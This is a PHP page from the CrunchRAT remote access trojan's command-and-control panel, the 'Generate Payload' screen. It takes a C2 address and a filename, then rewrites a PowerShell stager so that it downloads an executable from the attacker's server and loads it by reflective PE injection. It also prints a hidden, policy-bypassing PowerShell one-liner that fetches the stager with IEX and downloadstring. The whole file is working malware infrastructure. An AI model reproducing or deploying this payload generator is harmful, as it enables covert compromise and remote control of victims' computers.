<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>

<!doctype html>
<html lang="en">
  <head> <!-- Start of header -->
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
    <link rel="stylesheet" type="text/css" href="jquery/jquery.dataTables.min.css"> <!-- dataTables CSS -->
    <script type="text/javascript" charset="utf8" src="jquery/jquery.dataTables.min.js"></script> <!-- dataTables JavaScript -->
  </head> <!-- End of header -->

  <body> <!-- Start of body -->
    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
      <a class="navbar-brand" href="#">CrunchRAT</a>
      <ul class="nav navbar-nav">
        <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
        <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
        <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
        <li class="nav-item active"><a class="nav-link" href="generatePayload.php">Generate Payload</a></li>
        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
          <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
            <li><a href="tasks.php">View Tasks</a></li>
            <li><a href="command.php">Task Command</a></li>
            <li><a href="upload.php">Task Upload</a></li>
            <li><a href="download.php">Task Download</a></li>
          </ul>
        </li> <!-- End of "Task" drop-down menu -->

        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
          <ul class="dropdown-menu">
            <li><a href="addUser.php">Add User</a></li>
            <li><a href="changePassword.php">Change Password</a></li>
            <li role="separator" class="divider"></li>
            <li><a href="logout.php">Logout</a></li>
          </ul>
        </li> <!-- End of "Account Management" drop-down menu -->
        <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
      </ul>
    </nav> <!-- End of navigation bar -->

    <div class="container"> <!-- Start of main body container -->
      <form role="form" class="form-inline" method="post"> <!-- Start of generate payload form -->
        <select name="architecture">
        <option value="x86">x86</option>
        <option value="x64">x64</option>
        </select>&nbsp;
        <input type="text" class="form-control" name="address" placeholder="C2 IP Address">
        <input type="text" style="width: 250px;" class="form-control" name="filename" placeholder="Filename (IE: CrunchRAT.exe)">
        <button type="submit" name="submit" class="btn btn-default">Generate Payload</button>
      </form> <!-- End of generate payload form -->
      <?php
        # If the user clicked "Task Command"
        if (isset($_POST["submit"]))
        {
          # If all fields are set
          if (isset($_POST["address"]) && !empty($_POST["address"]) && isset($_POST["filename"]) && !empty($_POST["filename"]) && isset($_POST["architecture"]) && !empty($_POST["architecture"]))
          {
            $address = $_POST["address"];
            $filename = $_POST["filename"];
            $architecture = $_POST["architecture"];

            # If we need to generate a x86 PowerShell payload
            if ($architecture == "x86")
            {
              # Removes last two lines from m.ps1
              # Code modified from http://forums.devshed.com/php-development-5/delete-line-text-file-433972.html 
              $remove = 2; # Lines to remove

              # Starting position ( skip the last \n in the file if it exists) 
              $pos = -2; 

              $io = fopen($stagerFilename, 'r+');

              while ($remove != 0) 
              { 
                if (fseek($io, $pos--, SEEK_END) == -1) 
                  { 
                    break; 
                  } 
                  else if (fgetc($io) == "\n") 
                  { 
                    $remove -= 1; 
                  } 
              } 
              ftruncate ($io, ftell($io)); 
              fclose ($io);
            
              # Echo out new lines to m.ps1
              $newLine = '[Byte[]]$PEBytes = $WebClient.DownloadData(\'https://' . $address . '/' . $filename .'\')' . "\n";
              file_put_contents($stagerFilename, $newLine, FILE_APPEND);

              $newLine = 'Invoke-ReflectivePEInjection -PEBytes $PEBytes' . "\n";
              file_put_contents($stagerFilename, $newLine, FILE_APPEND);

              # Constructs x86 PowerShell one-liner based off the provided information
              $oneliner = '%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted -w hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; IEX ((new-object net.webclient).downloadstring(\'https://' . $address . '/' . $stagerFilename . '\'))"';

              # Displays success message - "Successfully generated payload."
              # Displays constructed x86 PowerShell one-liner to the RAT user
              echo "<br><div class='alert alert-success'>Successfully generated payload for x86 system.</div>";
              echo "<div class='alert alert-success'>" . $oneliner . "</div>";
            }

            # If we need to generate a x64 PowerShell payload
            if ($architecture == "x64")
            {
              # Removes last two lines from m.ps1
              # Code modified from http://forums.devshed.com/php-development-5/delete-line-text-file-433972.html 
              $remove = 2; # Lines to remove

              # Starting position ( skip the last \n in the file if it exists) 
              $pos = -2; 

              $io = fopen($stagerFilename, 'r+');

              while ($remove != 0) 
              { 
                if (fseek($io, $pos--, SEEK_END) == -1) 
                  { 
                    break; 
                  } 
                  else if (fgetc($io) == "\n") 
                  { 
                    $remove -= 1; 
                  } 
              } 
              ftruncate ($io, ftell($io)); 
              fclose ($io);
            
              # Echo out new lines to m.ps1
              $newLine = '[Byte[]]$PEBytes = $WebClient.DownloadData(\'https://' . $address . '/' . $filename .'\')' . "\n";
              file_put_contents($stagerFilename, $newLine, FILE_APPEND);

              $newLine = 'Invoke-ReflectivePEInjection -PEBytes $PEBytes' . "\n";
              file_put_contents($stagerFilename, $newLine, FILE_APPEND);

              # Constructs x64 PowerShell one-liner based off the provided information
              $oneliner = '%SystemRoot%\SysWoW64\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted -w hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; IEX ((new-object net.webclient).downloadstring(\'https://' . $address . '/' . $stagerFilename . '\'))"';

              # Displays success message - "Successfully generated payload."
              # Displays constructed x64 PowerShell one-liner to the RAT user
              echo "<br><div class='alert alert-success'>Successfully generated payload for x64 system.</div>";
              echo "<div class='alert alert-success'>" . $oneliner . "</div>";
            }
          }
          else
          {
            # Displays error message - "Please fill out all fields."
            echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
          }
        }
      ?>
    </div> <!-- End main body container -->
  </body> <!-- End of body -->
</html>